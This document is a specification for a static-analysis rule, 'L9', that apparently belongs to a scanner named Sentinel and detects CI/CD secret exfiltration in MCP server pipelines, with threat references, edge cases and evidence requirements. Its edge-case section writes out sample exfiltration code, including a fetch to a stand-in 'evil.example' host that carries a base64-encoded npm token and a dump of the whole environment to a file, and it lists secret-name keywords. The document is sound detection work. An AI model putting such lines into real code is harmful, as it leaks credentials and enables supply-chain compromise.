---
rule_id: L9
interface_version: v2
severity: critical

threat_refs:
  - kind: cve
    id: CVE-2025-30066
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-30066
    summary: >
      tj-actions/changed-files — CI/CD secret exfiltration via workflow logs.
      A compromised GitHub Action dumped secrets from process.env into
      workflow logs (AWS access keys, GitHub PATs, npm tokens, RSA keys)
      that were then harvested by the attacker. Canonical L9 precedent:
      secret-bearing environment variable flows to a log / network sink
      without masking. CVSS 8.6.
  - kind: paper
    id: Unit42-Shai-Hulud-2025
    url: https://unit42.paloaltonetworks.com/npm-supply-chain-secrets-exfiltration/
    summary: >
      Shai-Hulud worm (Sept 2025) — self-propagating npm supply-chain worm
      that harvested npm publish tokens, AWS access keys, and GitHub PATs
      from process.env during CI execution, then uploaded them to
      attacker-controlled public GitHub repositories. The exfil channel
      of choice in the worm was (1) a plain-text fetch to an attacker
      domain AND (2) a base64 blob embedded in a workflow artifact — both
      covered by L9's AST taint chain.
  - kind: paper
    id: Datadog-DevSecOps-2026-Supply-Chain
    url: https://www.datadoghq.com/state-of-devsecops/
    summary: >
      Datadog State of DevSecOps 2026 report documents that 38% of
      observed CI compromises in 2025 used environment-variable
      exfiltration as the primary data-theft channel; the median time
      from secret injection to credential abuse was 7 minutes. Empirical
      justification for L9's critical severity.
  - kind: spec
    id: OWASP-ASI04-agentic-supply-chain
    url: https://owasp.org/www-project-agentic-ai-top-10/
    summary: >
      OWASP Agentic AI Top 10 — ASI04 Agentic Supply Chain. Install-time
      and build-time secret theft inside an MCP server's CI pipeline is
      the canonical ASI04 attack surface; the exfiltrated tokens grant
      the attacker the ability to publish a malicious next version of
      the same server.

lethal_edge_cases:
  - >
    Base64 / hex / URL-encoding wrapper — `fetch("https://evil.example/" +
    Buffer.from(process.env.NPM_TOKEN).toString("base64"))`. A rule that
    only matched `process.env.TOKEN` directly inside `fetch(...)` would
    miss the wrapped form. The AST taint analyser must follow the
    template-embed / assignment hops through the Buffer call.
  - >
    Secret stored in a workflow artifact before exfil — `fs.writeFile("./
    out.json", JSON.stringify(process.env))` followed by a separate step
    that uploads `out.json`. The rule fires at the writeFile sink
    (file_write category), because the artifact-upload step is outside
    the source-code scope.
  - >
    Indirect log exposure via `logger.info({ env: process.env })` — the
    structured logger wraps the secret in an object but the object field
    still carries the plaintext value into the log transport. The rule
    treats any `xss`-category sink (console.log / logger.info / print)
    whose propagation chain contains a TOKEN/SECRET/KEY identifier as a
    log-exposure finding.
  - >
    Bulk env dump — `JSON.stringify(process.env)` / `dict(os.environ)`.
    Every CI secret is captured in one expression. No variable name
    clue; detection must treat the whole-env access as tainted and
    follow it to the sink.
  - >
    Legitimate env access to non-secret variables — `process.env.NODE_ENV`
    or `process.env.PORT` logged for diagnostics. Without a secret-name
    filter, every Node.js app would be flagged. The rule suppresses
    findings whose taint expression path contains ONLY non-sensitive
    variable names.

edge_case_strategies:
  - encoded-exfil-follow            # taint chain follows Buffer.from / btoa / base64 wrappers
  - artifact-dump-via-file-write    # file_write sink with env source counts
  - indirect-log-exposure           # xss-category log sinks with secret identifier on path
  - bulk-env-dump                   # Object.keys(process.env) / JSON.stringify(process.env)
  - secret-name-allowlist           # suppress when path only mentions non-sensitive env names
  - ast-taint-interprocedural       # inherited from the shared taint-rule-kit
  - lightweight-taint-fallback      # inherited — catches Python os.environ flows AST misses

evidence_contract:
  minimum_chain:
    source: true
    propagation: true
    sink: true
    mitigation: true
    impact: true
  required_factors:
    - ast_confirmed
    - secret_name_heuristic
    - unmitigated_sink_reachability
  location_kinds:
    - source
    - config

obsolescence:
  retire_when: >
    Every mainstream CI platform (GitHub Actions, GitLab CI, CircleCI,
    Jenkins, Azure Pipelines) rejects workflow definitions that read
    from `env.*_TOKEN` / `secrets.*` outside a provider-enforced secret
    scope, AND every MCP server publishing toolchain uses short-lived
    OIDC tokens instead of long-lived PATs. At that point the secret
    exfiltration primitive becomes effectively unexploitable and L9
    becomes redundant coverage vs. C5 / K8.
---

# L9 — CI/CD Secret Exfiltration Patterns

**Author:** Senior MCP Threat Researcher persona (adversarial, supply-chain).
**Applies to:** MCP server build / test / release pipelines written in
TypeScript, JavaScript, or Python whose source is scanned by Sentinel
(npm postinstall scripts, GitHub Actions composite runs, Python setup.py
hooks, release-publishing scripts).

## What an auditor accepts as evidence

An ISO 27001 A.5.23 (Information security for use of cloud services) or
OWASP ASI04 auditor requires:

1. **Source** — a `source`-kind Location where an untrusted / secret-
   bearing environment read happens (`process.env.GITHUB_TOKEN`,
   `os.environ["NPM_TOKEN"]`, `secrets.AWS_SECRET_ACCESS_KEY`).

2. **Propagation** — one link per AST hop. Zero hops means the env
   expression is the sink argument directly (`fetch(process.env.X)`);
   one or more hops means the value passed through an intermediate
   (Buffer.from, JSON.stringify, a user-defined helper).

3. **Sink** — a `source`-kind Location on the exfil call. Categories:
   `ssrf` / `url_request` (HTTP exfil), `dns_exfil` (DNS tunnelling —
   defers to G7 but co-fires), `xss` (console.log / logger.info /
   print — log exposure), `file_write` (artifact dump).

4. **Mitigation** — sanitizer on the path (for L9 any `addMask` /
   `::add-mask::` / redact / scrub call). Absent in the vulnerable
   case. The CHARTER edge case on wrappers requires the sanitizer
   name to be on the audited list before severity drops.

5. **Impact** — `credential-theft`, scope `connected-services`,
   exploitability `trivial` on direct HTTP flow and `moderate` on
   multi-hop.

6. **Verification steps** — open the env read, open the sink, trace
   the path, confirm no CI-level secret mask is configured.

## What L9 does NOT claim

- It does not flag every `process.env.PORT` read. The secret-name
  heuristic (TOKEN, SECRET, KEY, PASSWORD, CREDENTIAL, AUTH, API_KEY,
  NPM_TOKEN, GITHUB_TOKEN, AWS_* etc.) filters non-sensitive env.
- It does not prove the destination URL is attacker-controlled — that
  is a verification-step responsibility, not a static guarantee.

## Why confidence is capped at 0.88

AST-confirmed env→network flows are strong evidence. The 0.12 gap
preserves room for:

- CI-level secret masking (`::add-mask::`) that the static analyser
  cannot see — masking neutralises the log variant but not the
  network variant.
- Workflow-definition-level restrictions (`permissions: {}` blocks,
  OIDC token scoping) that invalidate the assumed privilege model.
- Legitimate health-check / telemetry endpoints that happen to
  concatenate a token for the service's own auth header.
